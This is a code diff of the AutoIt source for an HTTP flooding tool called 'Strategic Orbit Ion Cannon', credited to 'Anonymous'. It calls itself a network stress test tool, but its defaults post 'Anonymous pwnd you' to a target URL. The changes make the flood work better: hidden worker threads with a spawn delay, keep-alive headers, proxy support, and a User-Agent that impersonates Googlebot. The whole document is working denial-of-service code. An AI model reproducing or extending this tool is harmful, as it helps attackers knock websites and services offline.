@@ -3,23 +3,27 @@
 #AutoIt3Wrapper_UseX64=n
 #AutoIt3Wrapper_Res_Comment=DownloadLink = https://github.com/Anonymous-Dev/Soic
 #AutoIt3Wrapper_Res_Description=Network stress test tool
-#AutoIt3Wrapper_Res_Fileversion=1.0.0.3
+#AutoIt3Wrapper_Res_Fileversion=1.0.0.5
 #AutoIt3Wrapper_Res_Fileversion_AutoIncrement=p
 #AutoIt3Wrapper_Res_LegalCopyright=© Anonymous Author Vlad
 #AutoIt3Wrapper_AU3Check_Stop_OnWarning=y
 #AutoIt3Wrapper_Run_Tidy=y
 #endregion ;**** Directives created by AutoIt3Wrapper_GUI ****
+#region converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
+#endregion converted Directives from I:\Documents and Settings\Administrator.MICROSOF-5ED605\Soic\soic.au3.ini
+;
 $oMyError = ObjEvent("AutoIt.Error", "IgnoreErr") ; Ignore errors and resume script
 ;$oMyError = ObjEvent("AutoIt.Error", "MyErrFunc") ; Initialize a COM error handler
 If $CmdLine[0] = 3 Then
 	Opt("TrayIconHide", 1)
-	Local $athread[16], $2xx, $3xx, $4xx, $5xx, $Dropped, $TotKB, $oHTTP
+	Local $athread[16], $2xx, $3xx, $4xx, $5xx, $Dropped, $TotKB, $oHTTP, $response0 = ""
 	For $column = 0 To 15
 		$athread[$column] = RegRead("HKCU\Software\soic", $CmdLine[1] & $column)
 		If @error Then Exit
 	Next
 	; split headers to name/value pairs and place to array
 	$aNameValue = StringSplit($athread[3], @CRLF, 1)
+	$T0 = TimerInit()
 	While 1
 		$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
 		With $oHTTP
@@ -34,14 +38,24 @@ If $CmdLine[0] = 3 Then
 				If $aNameValue[$header] = "" Or $aNameValue[$header + 1] = "" Then ExitLoop
 				.SetRequestHeader($aNameValue[$header], $aNameValue[$header + 1])
 			Next
-			.Send($athread[2])
-			;.Abort
-			.WaitForResponse($athread[14])
-			;_ArrayDisplay($aListView)
-			;$timeinit = TimerInit()
-			;MsgBox(0, "Time Difference", $Pid)
-
-			Switch .Status
+		EndWith
+		While 1
+			With $oHTTP
+				.Send($athread[2])
+				;.Abort
+				.WaitForResponse($athread[14])
+				;_ArrayDisplay($aListView)
+				;$timeinit = TimerInit()
+				;MsgBox(0, "Time Difference", $Pid)
+				$response1 = .Responsetext
+				$TotKB += BinaryLen(StringToBinary($response1)) / 1024
+				If $CmdLine[3] = 1 And $response1 <> "" And $response0 <> $response1 Then
+					RegWrite("HKCU\Software\soic", "Response", "REG_MULTI_SZ", .StatusText & @CRLF & $response1)
+					$response0 = $response1
+					Sleep(3000)
+				EndIf
+			EndWith
+			Switch $oHTTP.Status
 				Case 200 To 299
 					$2xx += 1
 				Case 300 To 399
@@ -52,13 +66,17 @@ If $CmdLine[0] = 3 Then
 					$5xx += 1
 				Case Else
 					$Dropped += 1
+					If TimerDiff($T0) > 1000 Then
+						RegWrite("HKCU\Software\soic", $CmdLine[1] & "Status" & $CmdLine[2], "REG_MULTI_SZ", $2xx & "|" & $3xx & "|" & $4xx & "|" & $5xx & "|" & $Dropped & "|" & $TotKB)
+						$T0 = TimerInit()
+					EndIf
+					ExitLoop
 			EndSwitch
-			If $CmdLine[3] = 1 Then
-				RegWrite("HKCU\Software\soic", "Response", "REG_MULTI_SZ", .Responsetext)
+			If TimerDiff($T0) > 1000 Then
+				RegWrite("HKCU\Software\soic", $CmdLine[1] & "Status" & $CmdLine[2], "REG_MULTI_SZ", $2xx & "|" & $3xx & "|" & $4xx & "|" & $5xx & "|" & $Dropped & "|" & $TotKB)
+				$T0 = TimerInit()
 			EndIf
-			$TotKB += BinaryLen(StringToBinary(.Responsetext)) / 1024
-			RegWrite("HKCU\Software\soic", $CmdLine[1] & "Status" & $CmdLine[2], "REG_MULTI_SZ", $2xx & "|" & $3xx & "|" & $4xx & "|" & $5xx & "|" & $Dropped & "|" & $TotKB)
-		EndWith
+		WEnd
 	WEnd
 Else
 	Opt("GUICloseOnESC", 0);turn off exit on esc.
@@ -68,7 +86,6 @@ Else
 	Opt("TrayMenuMode", 1)
 	TrayCreateItem("Exit")
 	TrayItemSetOnEvent(-1, "GuiClose")
-
 	Global $DebugIt = 0 ; write some info to std out
 	Global $Debug_CB = False
 	Global $Debug_LV = False
@@ -167,13 +184,18 @@ Else
 	; ===============================================================================================================================
 	Global Const $tagLVITEM = "uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & _
 			"int Indent;int GroupID;uint Columns;ptr pColumns"
-	$Gui = GUICreate("Strategic Orbit Ion Cannon 1.0.0.3 Beta", 970, 460, 200, 125)
+	$Gui = GUICreate("Strategic Orbit Ion Cannon 1.0.0.4 Beta", 970, 460, 200, 125)
 	GUISetOnEvent(-3, "GuiClose") ; $GUI_EVENT_CLOSE = -3
 	$__LISTVIEWCTRL = GUICtrlCreateListView("TargetUrlIp|Method|PostData|HttpHeaders|Threads|ProxyIp:port|ProxyUserName|ProxyPassword|ServerUserName|" & _
 			"ServerPassword|ResolveTimeout, ms|ConnectTimeout|SendTimeout|ReceiveTimeout|WaitForResponse, sec", 0, 64, 970, 150, 0x0008) ; $LVS_SHOWSELALWAYS = 0x0008
 	GUICtrlSendMsg($__LISTVIEWCTRL, 0x1000 + 54, 0x00000001, 0x00000001) ; $LVM_SETEXTENDEDLISTVIEWSTYLE = ($LVM_FIRST + 54) $LVS_EX_GRIDLINES = 0x00000001
 	GUICtrlSendMsg($__LISTVIEWCTRL, 0x1000 + 54, 0x00000004, 0x00000004) ; $LVM_SETEXTENDEDLISTVIEWSTYLE = ($LVM_FIRST + 54) $LVS_EX_CHECKBOXES = 0x00000004
 	$Edit = GUICtrlCreateEdit("", 0, 215, 970, 223)
+	$TimeBetweenThreads = GUICtrlCreateInput("0", 600, 20, 70, 20)
+	GUICtrlSetStyle(-1, 8192) ; $ES_NUMBER = 8192
+	GUICtrlCreateUpdown($TimeBetweenThreads, BitOR(0x0020, 0x0080)) ; $UDS_ARROWKEYS = 0x0020 $UDS_NOTHOUSANDS = 0x0080
+	GUICtrlSetLimit(-1, 999999999999999, 0)
+	GUICtrlCreateLabel("Thread spawn delay, ms", 530, 20, 70, 30)
 	$CBresp = GUICtrlCreateCheckbox("Show Response", 700, 10)
 	$CBreg = GUICtrlCreateCheckbox("Clear registry", 700, 30)
 	GUICtrlSetState(-1, 1)
@@ -185,7 +207,6 @@ Else
 	Global $LVcolRControl[$nColumnCount] = [256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256, 256] ; right click actions
 	_SetLvContext("ContextMenu") ;set context function
 	$Button1 = GUICtrlCreateCheckbox("IMMA CHARGIN MAH LAZER", 800, 20, 161, 33, 0x1000) ; $BS_PUSHLIKE = 0x1000
-	GUICtrlSetOnEvent($Button1, "IgnoreErr")
 	$StatusBar1 = _GUICtrlStatusBar_Create($Gui)
 	_GUICtrlStatusBar_SetParts($StatusBar1, -1) ; the right edge of the corresponding part extends to the border of the window
 	_InitEditLib("", "", "", "", "", "", $Gui)
@@ -258,7 +279,7 @@ Exit
 
 Func Button1Click()
 	$nItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
-	Local $aListView[1][$nColumnCount], $2xx, $3xx, $4xx, $5xx, $Dropped, $nCheckedItem = 0, $aHeaders[$CheckedCount][2], $oHTTP[$CheckedCount], $TotKB0 = 0, $Hits0 = 0
+	Local $aListView[1][$nColumnCount], $nCheckedItem = 0, $aHeaders[$CheckedCount][2], $oHTTP[$CheckedCount], $TotKB0 = 0, $Hits0 = 0
 	For $item = 0 To $nItemCount - 1
 		If _GUICtrlListView_GetItemChecked($__LISTVIEWCTRL, $item) Then
 			$nCheckedItem += 1
@@ -285,7 +306,7 @@ Func Button1Click()
 							Case Else
 								$aListView[$nCheckedItem - 1][$nColumnCount] = 2 ; use specified proxy
 						EndSwitch
-						RegWrite("HKCU\Software\soic", $item & "15", "REG_MULTI_SZ", $aListView[$nCheckedItem - 1][15])
+						RegWrite("HKCU\Software\soic", $nCheckedItem & "15", "REG_MULTI_SZ", $aListView[$nCheckedItem - 1][15])
 					Case 6
 						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = " " ; default proxyUserName
 					Case 7
@@ -303,12 +324,13 @@ Func Button1Click()
 					Case 13
 						If $aListView[$nCheckedItem - 1][$column] = "" Then $aListView[$nCheckedItem - 1][$column] = 30000 ; default receive timeout
 				EndSwitch
-				RegWrite("HKCU\Software\soic", $item & $column, "REG_MULTI_SZ", $aListView[$nCheckedItem - 1][$column])
+				RegWrite("HKCU\Software\soic", $nCheckedItem & $column, "REG_MULTI_SZ", $aListView[$nCheckedItem - 1][$column])
 			Next
 			$UBpid = UBound($Pid)
 			ReDim $Pid[$UBpid + $aListView[$nCheckedItem - 1][4]]
-			For $thread = 0 To $aListView[$nCheckedItem - 1][4] - 1
-				$Pid[$UBpid + $thread] = Run(@ScriptName & " " & $item & " " & $thread & " " & GUICtrlRead($CBresp), @SystemDir, @SW_HIDE, 0x1)
+			For $thread = 1 To $aListView[$nCheckedItem - 1][4]
+				$Pid[$UBpid + $thread - 1] = Run(@ScriptName & " " & $nCheckedItem & " " & $thread & " " & GUICtrlRead($CBresp), @SystemDir, @SW_HIDE, 0x1)
+				Sleep(GUICtrlRead($TimeBetweenThreads))
 			Next
 		EndIf
 	Next
@@ -321,15 +343,13 @@ Func Button1Click()
 			For $i = 1 To UBound($Pid) - 1
 				ProcessClose($Pid[$i])
 			Next
+			RegDelete("HKCU\Software\soic")
 			ExitLoop
 		EndIf
-		If GUICtrlRead($CBresp) = 1 Then
-			$HtmlSource = RegRead("HKCU\Software\soic", "Response")
-			If $HtmlSource <> "" Then GUICtrlSetData($Edit, $HtmlSource)
-		EndIf
+		If GUICtrlRead($CBresp) = 1 Then GUICtrlSetData($Edit, RegRead("HKCU\Software\soic", "Response"))
 		Local $2xx = 0, $3xx = 0, $4xx = 0, $5xx = 0, $Dropped = 0, $TotKB1 = 0
-		For $item = 0 To $nCheckedItem - 1
-			For $thread = 0 To $aListView[$nCheckedItem - 1][4] - 1
+		For $item = 1 To $nCheckedItem
+			For $thread = 1 To $aListView[$item - 1][4]
 				$aStatus = StringSplit(RegRead("HKCU\Software\soic", $item & "Status" & $thread), "|")
 				If @error Then ExitLoop 1
 				$2xx += $aStatus[1]
@@ -341,57 +361,11 @@ Func Button1Click()
 			Next
 		Next
 		$Hits1 = $2xx + $3xx + $4xx + $5xx
-		$statMsg1 = StringFormat("2xx: %u 3xx: %u 4xx: %u 5xx: %u Dropped: %u Received,KB: %u KB/sec: %.1f Hit/sec: %.1f", $2xx & @TAB, $3xx & @TAB, $4xx & @TAB, $5xx & @TAB, $Dropped & @TAB, $TotKB1 & @TAB, 1000 * ($TotKB1 - $TotKB0) / TimerDiff($T0) & @TAB, 1000 * ($Hits1 - $Hits0) / TimerDiff($T0))
+		$statMsg1 = StringFormat("2xx: %u 3xx: %u 4xx: %u 5xx: %u Dropped: %u Received,KB: %u KB/sec: %.1f Hit/sec: %.1f", $2xx & @TAB, $3xx & @TAB, $4xx & @TAB, $5xx & @TAB, $Dropped & @TAB, $TotKB1 & @TAB, $TotKB1 - $TotKB0 & @TAB, $Hits1 - $Hits0)
 		_GUICtrlStatusBar_SetText($StatusBar1, $statMsg1, 0)
 		$TotKB0 = $TotKB1
 		$Hits0 = $Hits1
 	WEnd
-
-	#CS 	While 1
-		$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
-		For $item = 0 To $nCheckedItem - 1
-		$timeinit = TimerInit()
-		If GUICtrlRead($Button1) <> 1 Then ExitLoop 2 ; 1 = $GUI_CHECKED lazor button pressed.
-		With $oHTTP
-		.SetProxy($aListView[$item][$nColumnCount], $aListView[$item][5], "") ; Use proxy_server for all domains. BypassList = ""
-		.SetTimeouts($aListView[$item][10], $aListView[$item][11], $aListView[$item][12], $aListView[$item][13])
-		;.SetClientCertificate("LOCAL_MACHINE\Personal\My Certificate")
-		.Open($aListView[$item][1], $aListView[$item][0], True)
-		;.SetAutoLogonPolicy(2) ; Always = 0, default OnlyIfBypassProxy = 1, Never = 2
-		.SetCredentials($aListView[$item][6], $aListView[$item][7], 1) ; set credentials for proxy
-		.SetCredentials($aListView[$item][8], $aListView[$item][9], 0) ; set credentials for server
-		For $header = 0 To UBound($aHeaders, 2) - 2 Step 2
-		If $aHeaders[$item][$header] = "" Or $aHeaders[$item][$header + 1] = "" Then ExitLoop
-		.SetRequestHeader($aHeaders[$item][$header], $aHeaders[$item][$header + 1])
-		Next
-		.Send($lvEditText[$item][0])
-		;.Abort
-		.WaitForResponse($aListView[$item][14])
-		If GUICtrlRead($CBresp) = 1 Then
-		$HtmlSource = .Responsetext
-		If $HtmlSource <> "" Then GUICtrlSetData($Edit, $HtmlSource)
-		EndIf
-		;_ArrayDisplay($aListView)
-		;$timeinit = TimerInit()
-		;MsgBox(0, "Time Difference", $Pid)
-		Switch .Status
-		Case 200 To 299
-		$2xx += 1
-		Case 300 To 399
-		$3xx += 1
-		Case 400 To 499
-		$4xx += 1
-		Case 500 To 599
-		$5xx += 1
-		Case Else
-		$Dropped += 1
-		EndSwitch
-		$statMsg1 = StringFormat("2xx: %u 3xx: %u 4xx: %u 5xx: %u Dropped: %u Hits/sec: %.1f KB/sec: %.1f", $2xx & @TAB, $3xx & @TAB, $4xx & @TAB, $5xx & @TAB, $Dropped & @TAB, 1000 / TimerDiff($timeinit) & @TAB, BinaryLen(StringToBinary(.Responsetext)) / 1024)
-		_GUICtrlStatusBar_SetText($StatusBar1, $statMsg1, 0)
-		EndWith
-		Next
-		WEnd
-	#CE
 EndFunc   ;==>Button1Click
 
 Func GuiClose()
@@ -444,12 +418,13 @@ Func ContextMenu($aLVInfo)
 	;----------------------------------------------------------------------------------------------
 	Switch $ctx
 		Case $HelpCtx[2]
-			GUICtrlCreateListViewItem("http://|GET|Anonymous pwnd you|User-Agent" & @CRLF & "Goog1ebot/2.1 (+http://www.google.com/bot.html)" _
-					 & @CRLF & "Content-type" & @CRLF & "text/html|10||||||5000|60000|30000|30000|0", $__LISTVIEWCTRL)
+			GUICtrlCreateListViewItem("http://|GET|Anonymous pwnd you|User-Agent" & @CRLF & "Googlebot/2.1 (+http://www.google.com/bot.html)" _
+					 & @CRLF & "Accept-Encoding" & @CRLF & "gzip" & @CRLF & "Connection" & @CRLF & "keep-alive" & @CRLF & "Content-type" & @CRLF & "text/html|10||||||5000|60000|30000|30000|0", $__LISTVIEWCTRL)
 			Local $ItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
 			ReDim $lvEditText[$ItemCount][2]
 			$lvEditText[$ItemCount - 1][0] = "Anonymous pwnd you"
-			$lvEditText[$ItemCount - 1][1] = "User-Agent" & @CRLF & "Goog1ebot/2.1 (+http://www.google.com/bot.html)" & @CRLF & "Content-type" & @CRLF & "text/html"
+			$lvEditText[$ItemCount - 1][1] = "User-Agent" & @CRLF & "Googlebot/2.1 (+http://www.google.com/bot.html)" & @CRLF & "Accept-Encoding" & @CRLF & "gzip" _
+					 & @CRLF & "Connection" & @CRLF & "keep-alive" & @CRLF & "Content-type" & @CRLF & "text/html"
 		Case $HelpCtx[4]
 			Local $ItemCount = _GUICtrlListView_GetItemCount($__LISTVIEWCTRL)
 			If (_GUICtrlListView_GetSelectedCount($__LISTVIEWCTRL) == $ItemCount) Then
